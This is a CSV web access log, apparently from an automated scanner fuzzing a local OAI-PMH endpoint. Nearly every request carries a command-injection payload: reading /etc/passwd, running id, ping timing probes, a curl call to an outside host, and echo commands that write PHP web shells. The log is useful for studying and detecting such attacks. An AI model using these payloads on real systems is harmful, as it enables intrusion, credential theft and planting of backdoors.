uuid,timestamp,http_status_code,request_url,response_time,http_version
d90b925e-826a-4a11-a4b9-bd9424bf3ef2,2025-01-01 17:25:51,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250A%2Fusr%2Fbin%2Fid%250A,2125.01 ms,HTTP/1.1
48fb6c73-4f6a-4492-9ff5-8c2a98234041,2025-01-01 17:25:53,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%250A%2Fusr%2Fbin%2Fid%250A&set=%250A%2Fusr%2Fbin%2Fid%250A,2174.08 ms,HTTP/1.1
8c317d47-eedf-4d02-b6a9-171a2d670960,2025-01-01 17:25:56,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250A%2Fusr%2Fbin%2Fid%250A&until=%250A%2Fusr%2Fbin%2Fid%250A&set=%250A%2Fusr%2Fbin%2Fid%250A,2130.03 ms,HTTP/1.1
cd82063b-bde5-440f-8f3e-10d2afe15048,2025-01-01 17:25:58,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid%250A&metadataPrefix=marc,2111.85 ms,HTTP/1.1
4c08fe10-b551-4640-b6af-f945717531e6,2025-01-01 17:26:00,403,http://localhost:8081/oai/request?verb=%250Acat%2520%2Fetc%2Fpasswd,2084.07 ms,HTTP/1.1
117d9ee1-850b-4e9f-8c38-e7e4d73c6bb8,2025-01-01 17:26:03,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%250Acat%2520%2Fetc%2Fpasswd,2125.13 ms,HTTP/1.1
9ad8758c-851a-4983-8482-8726bc2ee654,2025-01-01 17:26:05,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250Acat%2520%2Fetc%2Fpasswd,2099.30 ms,HTTP/1.1
c942f91e-1d24-440c-9b1c-e221421dbb6e,2025-01-01 17:26:08,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%250Acat%2520%2Fetc%2Fpasswd,2109.04 ms,HTTP/1.1
59194ad0-b3f7-4a6c-8a2d-e5289b85058b,2025-01-01 17:26:10,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250Acat%2520%2Fetc%2Fpasswd&set=%250Acat%2520%2Fetc%2Fpasswd,2123.52 ms,HTTP/1.1
205fc383-acd5-4c23-bd2f-03de4fc24922,2025-01-01 17:26:12,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250Acat%2520%2Fetc%2Fpasswd&metadataPrefix=oai_dc,2151.76 ms,HTTP/1.1
048c789f-0de6-41ab-a473-8e1d6e90acf5,2025-01-01 17:26:15,403,http://localhost:8081/oai/request?verb=%250Aid,2066.71 ms,HTTP/1.1
702ec04a-4873-4ad0-b6ec-cc38690ce8c5,2025-01-01 17:26:17,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2121.77 ms,HTTP/1.1
41325989-34d7-4eb0-a0a0-c8aa84e2f288,2025-01-01 17:26:20,200,http://localhost:8081/oai/request?verb=ListSets,2138.34 ms,HTTP/1.1
4387ffd4-6412-4c68-a517-5558dfb4d565,2025-01-01 17:26:22,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250Aid,2118.34 ms,HTTP/1.1
3fff67b2-545d-491d-8ba5-0abc81aaa09d,2025-01-01 17:26:24,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%250Aid,2109.19 ms,HTTP/1.1
6d1174a7-e977-401a-8bff-d84460fab803,2025-01-01 17:26:27,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250Aid&metadataPrefix=marc,2095.49 ms,HTTP/1.1
11194d8f-31fa-4d2d-bf2b-b7f50c03755d,2025-01-01 17:26:29,403,http://localhost:8081/oai/request?verb=%250Aid%250A,2085.56 ms,HTTP/1.1
c37d7606-3309-4295-8f17-1fdb9a76eacd,2025-01-01 17:26:32,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2139.29 ms,HTTP/1.1
4eb58898-2bde-4bce-ad59-abddfad1c574,2025-01-01 17:26:34,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250Aid%250A,2111.41 ms,HTTP/1.1
7cb52d86-c715-4d8c-a334-9c9182cf7b2a,2025-01-01 17:26:36,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%250Aid%250A,2138.12 ms,HTTP/1.1
ab5d08cb-a88a-4cd4-9d0b-af4bd32b601d,2025-01-01 17:26:39,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250Aid%250A&set=%250Aid%250A,2138.57 ms,HTTP/1.1
19ef5762-9036-4fe1-93c6-e3de54b3a0bf,2025-01-01 17:26:41,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250Aid%250A&metadataPrefix=marc,2162.47 ms,HTTP/1.1
4b8eecb9-856b-4775-a983-e63081d0f1aa,2025-01-01 17:26:44,403,http://localhost:8081/oai/request?verb=%250a,2087.45 ms,HTTP/1.1
0574fa61-eacc-4eb6-b596-0e997a65bb80,2025-01-01 17:26:46,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2106.29 ms,HTTP/1.1
88d0af6e-0cfb-49ad-9e53-87b81ad3c628,2025-01-01 17:26:48,200,http://localhost:8081/oai/request?verb=ListSets,2105.43 ms,HTTP/1.1
409a4130-b48a-4091-950a-cc48a6971d7e,2025-01-01 17:26:51,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%250a&set=%250a,2161.70 ms,HTTP/1.1
7b2c389a-7f5c-4613-9c04-2f5df72dbada,2025-01-01 17:26:53,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%250a,2132.49 ms,HTTP/1.1
3e74c693-f808-4988-9b87-1ef88be9e09e,2025-01-01 17:26:56,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250a&metadataPrefix=marc,2117.28 ms,HTTP/1.1
57b483ea-508f-4b09-8edc-22a1fbcc1721,2025-01-01 17:26:58,403,http://localhost:8081/oai/request?verb=%250a+id+%250a,2093.07 ms,HTTP/1.1
a9585c31-83f4-4e19-87c8-fdf0692f5dfc,2025-01-01 17:27:00,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2122.53 ms,HTTP/1.1
451974a6-558f-4d33-999b-b38c4e8e9907,2025-01-01 17:27:03,200,http://localhost:8081/oai/request?verb=ListSets,2120.41 ms,HTTP/1.1
f0e2608c-3e41-4377-ab12-b53a4cfda41c,2025-01-01 17:27:05,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%250a+id+%250a,2148.03 ms,HTTP/1.1
9b169532-e226-417a-b961-eebdae84a80c,2025-01-01 17:27:08,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2104.34 ms,HTTP/1.1
dba0b4ba-f26f-4458-ac15-74e45c9edc37,2025-01-01 17:27:10,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250a+id+%250a&metadataPrefix=oai_dc,2133.15 ms,HTTP/1.1
a7e31146-6be6-4223-aafc-f05558100667,2025-01-01 17:27:12,403,http://localhost:8081/oai/request?verb=%250a+ping+-i+30+127.0.0.1+%250a,2088.48 ms,HTTP/1.1
f017e6f0-6f9b-4e89-8d49-b1439f05d1ab,2025-01-01 17:27:15,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%250a+ping+-i+30+127.0.0.1+%250a,2117.87 ms,HTTP/1.1
a23f1e47-2568-4db5-9310-0ea548633a75,2025-01-01 17:27:17,200,http://localhost:8081/oai/request?verb=ListSets,2125.38 ms,HTTP/1.1
37c35663-f1ae-4e54-a6c8-2106b007a6df,2025-01-01 17:27:20,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%250a+ping+-i+30+127.0.0.1+%250a,2132.38 ms,HTTP/1.1
b469b529-8e1b-45c5-8150-759f0a0c0f4c,2025-01-01 17:27:22,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250a+ping+-i+30+127.0.0.1+%250a,2138.80 ms,HTTP/1.1
23eb1d13-ea9a-4b13-87ea-b653a28b44ab,2025-01-01 17:27:24,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250a+ping+-i+30+127.0.0.1+%250a&metadataPrefix=oai_dc,2101.63 ms,HTTP/1.1
54fffcdc-55a3-405a-9f86-4684d141f6e8,2025-01-01 17:27:27,403,http://localhost:8081/oai/request?verb=%250a%250d,2088.46 ms,HTTP/1.1
1a5207ea-647b-4a06-9ebd-e08249e9b264,2025-01-01 17:27:29,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%250a%250d,2133.10 ms,HTTP/1.1
88ec441c-cd73-4f80-a876-4ec8c337ca08,2025-01-01 17:27:32,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250a%250d,2144.26 ms,HTTP/1.1
f285d5d6-bb2c-42e2-bcb9-190e81841058,2025-01-01 17:27:34,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250a%250d&set=%250a%250d,2097.38 ms,HTTP/1.1
14d27eb8-e5bc-4909-9467-b1d3d7614819,2025-01-01 17:27:36,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250a%250d&until=%250a%250d&set=%250a%250d,2129.89 ms,HTTP/1.1
d99dc2cc-02b4-44f3-8735-8c6811870c79,2025-01-01 17:27:39,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250a%250d&metadataPrefix=marc,2140.25 ms,HTTP/1.1
a92659d1-262a-46fb-a5ef-4985b030316e,2025-01-01 17:27:41,403,http://localhost:8081/oai/request?verb=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,2094.07 ms,HTTP/1.1
637f6332-b462-4d02-97d6-a263fb0e62a4,2025-01-01 17:27:44,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,2123.68 ms,HTTP/1.1
e5cabe54-3992-4c9a-b177-7de333cba707,2025-01-01 17:27:46,200,http://localhost:8081/oai/request?verb=ListSets,2124.93 ms,HTTP/1.1
1b3a3c72-059d-4072-b05e-acb836c4940d,2025-01-01 17:27:48,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2123.80 ms,HTTP/1.1
4128d9f5-8c21-4966-a7da-198b1993b313,2025-01-01 17:27:51,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&set=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,2140.37 ms,HTTP/1.1
bc3033d2-0c11-474d-9967-d8538e91dadc,2025-01-01 17:27:53,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&metadataPrefix=marc,2138.77 ms,HTTP/1.1
5dbb0759-d976-48a5-a45a-4d2648c42498,2025-01-01 17:27:56,403,http://localhost:8081/oai/request?verb=%2520%7B%24%7Bphpinfo%28%29%7D%7D,2091.68 ms,HTTP/1.1
d58d4047-8622-4a26-b71a-8d6ccab14815,2025-01-01 17:27:58,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2078.57 ms,HTTP/1.1
a2febd9f-b745-4167-88ea-0cc696912309,2025-01-01 17:28:00,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bphpinfo%28%29%7D%7D,2116.23 ms,HTTP/1.1
04040d0c-b6d0-46d4-a7df-2b324721535c,2025-01-01 17:28:03,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%2520%7B%24%7Bphpinfo%28%29%7D%7D&until=%2520%7B%24%7Bphpinfo%28%29%7D%7D,2133.04 ms,HTTP/1.1
ac5eb6bd-6a89-4af2-bf46-8a95933b7722,2025-01-01 17:28:05,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%2520%7B%24%7Bphpinfo%28%29%7D%7D&until=%2520%7B%24%7Bphpinfo%28%29%7D%7D,2135.98 ms,HTTP/1.1
b7f44397-a856-4e40-860c-124bc61ec346,2025-01-01 17:28:08,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bphpinfo%28%29%7D%7D&metadataPrefix=oai_dc,2095.79 ms,HTTP/1.1
3430bae5-af3c-4f5d-bdb6-0bb3afbfe85e,2025-01-01 17:28:10,403,http://localhost:8081/oai/request?verb=%2520%7B%24%7Bsleep%2820%29%7D%7D,2090.05 ms,HTTP/1.1
d9449f88-5cf2-4c8c-9300-4f5f928f709b,2025-01-01 17:28:12,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bsleep%2820%29%7D%7D,2122.37 ms,HTTP/1.1
c5ff8c27-0547-4ccc-bcd9-e2682d052113,2025-01-01 17:28:15,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%2820%29%7D%7D,2127.12 ms,HTTP/1.1
e4e11123-3707-4ce6-a3bb-0919c40314c3,2025-01-01 17:28:17,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%2520%7B%24%7Bsleep%2820%29%7D%7D&set=%2520%7B%24%7Bsleep%2820%29%7D%7D,2104.45 ms,HTTP/1.1
f9c30729-e1c8-46b0-bf28-92777f2884a1,2025-01-01 17:28:19,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%2520%7B%24%7Bsleep%2820%29%7D%7D,2111.47 ms,HTTP/1.1
0c90ad1f-3b20-4419-bee1-7437dc2eaec4,2025-01-01 17:28:22,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%2820%29%7D%7D&metadataPrefix=oai_dc,2125.70 ms,HTTP/1.1
f0d23bf9-925e-452a-b7fc-802a1fad844d,2025-01-01 17:28:24,403,http://localhost:8081/oai/request?verb=%2520%7B%24%7Bsleep%283%29%7D%7D,2060.76 ms,HTTP/1.1
6dc0a814-907c-4eab-a42c-980fcede5b6b,2025-01-01 17:28:27,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bsleep%283%29%7D%7D,2137.75 ms,HTTP/1.1
ca6a2fe8-7307-4893-8ff5-049407d1ca5e,2025-01-01 17:28:29,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%283%29%7D%7D,2132.00 ms,HTTP/1.1
b9bc1121-32e3-4ba3-918b-569af89b212c,2025-01-01 17:28:31,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%2520%7B%24%7Bsleep%283%29%7D%7D,2146.62 ms,HTTP/1.1
8fd114ef-ffe2-47a3-bad1-54ad3f7386e1,2025-01-01 17:28:34,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%2520%7B%24%7Bsleep%283%29%7D%7D,2145.45 ms,HTTP/1.1
16b39ffa-f167-4d77-8ac8-14575f7b9651,2025-01-01 17:28:36,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%283%29%7D%7D&metadataPrefix=oai_dc,2150.19 ms,HTTP/1.1
f26a5daf-9f46-4a21-9e51-f38c2d7ea4a3,2025-01-01 17:28:39,403,http://localhost:8081/oai/request?verb=%26,2066.60 ms,HTTP/1.1
9a45d122-7dc0-4ed7-b6e5-584d80ff6b93,2025-01-01 17:28:41,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2114.72 ms,HTTP/1.1
7dc5fd0e-59da-4937-b569-e05ca10b3b13,2025-01-01 17:28:43,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26,2129.81 ms,HTTP/1.1
9876e70c-427e-4d47-bc31-27f1fb122140,2025-01-01 17:28:46,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26&set=%26,2129.19 ms,HTTP/1.1
bba12833-79fd-4522-a418-93b4b340fd9e,2025-01-01 17:28:48,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%26,2133.92 ms,HTTP/1.1
d1d65754-4ae3-4373-b242-270878a5b461,2025-01-01 17:28:51,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26&metadataPrefix=marc,2129.87 ms,HTTP/1.1
ee6f4c6f-a855-437d-910e-2930fa807fc2,2025-01-01 17:28:53,403,http://localhost:8081/oai/request?verb=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,2078.75 ms,HTTP/1.1
b496840d-15b8-46a1-97b3-f5629e78139f,2025-01-01 17:28:55,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,2125.73 ms,HTTP/1.1
9ef9352a-bc75-4b81-b1f9-e50616179225,2025-01-01 17:28:58,200,http://localhost:8081/oai/request?verb=ListSets,2136.08 ms,HTTP/1.1
c7aa0023-25f5-40da-a7ae-a823764ba0cb,2025-01-01 17:29:00,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2151.73 ms,HTTP/1.1
a7d3964d-81eb-4cf4-8782-b6f1570cd1df,2025-01-01 17:29:03,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&until=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,2125.28 ms,HTTP/1.1
b82bcb88-208a-4ecb-9c24-a7c51d920666,2025-01-01 17:29:05,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&metadataPrefix=marc,2109.23 ms,HTTP/1.1
9ffcffc7-3104-4ef5-a292-d4422ab90f4e,2025-01-01 17:29:07,403,http://localhost:8081/oai/request?verb=%26+dir,2055.32 ms,HTTP/1.1
ddf5b8fe-274b-4711-897b-5592b6009a6e,2025-01-01 17:29:10,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2128.24 ms,HTTP/1.1
32cac659-ea2e-4502-9f14-0c0f48d2817c,2025-01-01 17:29:12,200,http://localhost:8081/oai/request?verb=ListSets,2103.64 ms,HTTP/1.1
3612137e-7bba-46af-a5a0-799abf969828,2025-01-01 17:29:15,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%26+dir,2128.00 ms,HTTP/1.1
9d1d8166-240e-439c-9c2b-b8c0c22e2a20,2025-01-01 17:29:17,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2149.60 ms,HTTP/1.1
25582752-42a8-4b33-9547-a8754b4132c9,2025-01-01 17:29:19,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+dir&metadataPrefix=marc,2125.06 ms,HTTP/1.1
f8dece16-5d93-4db8-b9be-183a463bab3d,2025-01-01 17:29:22,403,http://localhost:8081/oai/request?verb=%26+dir+C%3A%5C,2088.38 ms,HTTP/1.1
0a7a50d0-2c5b-4630-b349-0b71fc94b54e,2025-01-01 17:29:24,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5C,2156.93 ms,HTTP/1.1
0228ec66-ecb8-4080-8348-49ca7b5fbdbd,2025-01-01 17:29:27,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+dir+C%3A%5C,2138.06 ms,HTTP/1.1
b11ef0b1-7a70-4954-bac1-2302dfb18481,2025-01-01 17:29:29,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26+dir+C%3A%5C,2144.29 ms,HTTP/1.1
1d1a7345-cafc-4aa7-bdc3-fcd4c3d7c8d6,2025-01-01 17:29:32,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2232.12 ms,HTTP/1.1
e5b086cc-fc4a-43f6-a783-58a00fdd0671,2025-01-01 17:29:34,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5C&metadataPrefix=marc,2141.28 ms,HTTP/1.1
e462c583-3b05-4e47-ae76-fb93a6ccf643,2025-01-01 17:29:36,403,http://localhost:8081/oai/request?verb=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,2090.55 ms,HTTP/1.1
43b0e6cd-936d-4c13-9431-b26afc1287a8,2025-01-01 17:29:39,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,2125.49 ms,HTTP/1.1
87d9b409-1559-4653-85ee-de7db0e66b9e,2025-01-01 17:29:41,200,http://localhost:8081/oai/request?verb=ListSets,2119.30 ms,HTTP/1.1
54231957-f17a-4194-b7f2-9471e3ea720c,2025-01-01 17:29:44,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&until=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&set=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,2132.16 ms,HTTP/1.1
040173ef-7d5d-4ef2-b1c5-205b742b55a6,2025-01-01 17:29:46,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,2102.29 ms,HTTP/1.1
214e3cd3-cf04-4221-80c2-72212d936418,2025-01-01 17:29:48,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&metadataPrefix=marc,2112.36 ms,HTTP/1.1
39eb5fc6-c5e6-4fc4-9929-effe69da4368,2025-01-01 17:29:51,403,http://localhost:8081/oai/request?verb=%26+dir+C%3A%5CUsers,2099.16 ms,HTTP/1.1
06bfc802-1aac-4d03-97b0-0df37e2c886d,2025-01-01 17:29:53,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5CUsers,2115.06 ms,HTTP/1.1
8fa8cabb-6a18-485d-aa2c-279815bbabe1,2025-01-01 17:29:56,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+dir+C%3A%5CUsers,2119.21 ms,HTTP/1.1
102f18a9-2785-4f1f-8922-30e16a206cf5,2025-01-01 17:29:58,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26+dir+C%3A%5CUsers,2128.84 ms,HTTP/1.1
b9ce87dc-b1c0-4bb5-9ad3-2fde55c2a045,2025-01-01 17:30:00,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+dir+C%3A%5CUsers&set=%26+dir+C%3A%5CUsers,2127.08 ms,HTTP/1.1
b08cc5d7-4e1d-476b-9d26-7c64ab64077d,2025-01-01 17:30:03,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5CUsers&metadataPrefix=oai_dc,2154.59 ms,HTTP/1.1
d345c2c4-332c-44d9-a37f-8c4b7b8f73c5,2025-01-01 17:30:05,403,http://localhost:8081/oai/request?verb=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,2078.73 ms,HTTP/1.1
f6f21c74-8898-47a7-9fb8-9f1ad7a2063d,2025-01-01 17:30:08,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,2092.16 ms,HTTP/1.1
0a547a34-9b54-4a76-81bf-80edd3b63f0e,2025-01-01 17:30:10,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,2141.40 ms,HTTP/1.1
2af717be-6eac-4d17-8501-4e9f28f7c564,2025-01-01 17:30:12,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2158.46 ms,HTTP/1.1
bca161ef-2cb2-4f76-b88d-745ace9a1c7b,2025-01-01 17:30:15,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&set=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,2114.37 ms,HTTP/1.1
d539f480-e6e2-48be-87c6-50103e152b54,2025-01-01 17:30:17,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&metadataPrefix=marc,2118.97 ms,HTTP/1.1
3820e01b-0a02-478e-a6e0-80cebe3378cb,2025-01-01 17:30:20,403,http://localhost:8081/oai/request?verb=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2069.15 ms,HTTP/1.1
e6f01620-6646-437c-afb8-b34f8d1e8e05,2025-01-01 17:30:22,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2070.38 ms,HTTP/1.1
1bcd604a-9a5b-4918-bdc8-053682c8f571,2025-01-01 17:30:24,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2070.61 ms,HTTP/1.1
dd9b5b56-2082-4515-80c5-7bca1675af25,2025-01-01 17:30:27,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2082.11 ms,HTTP/1.1
94f1a336-0814-401e-89f4-cd919f6e51b8,2025-01-01 17:30:29,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&set=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,2085.73 ms,HTTP/1.1
7ea643c2-0362-4842-928a-818dab4ce34c,2025-01-01 17:30:31,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&metadataPrefix=marc,2079.39 ms,HTTP/1.1
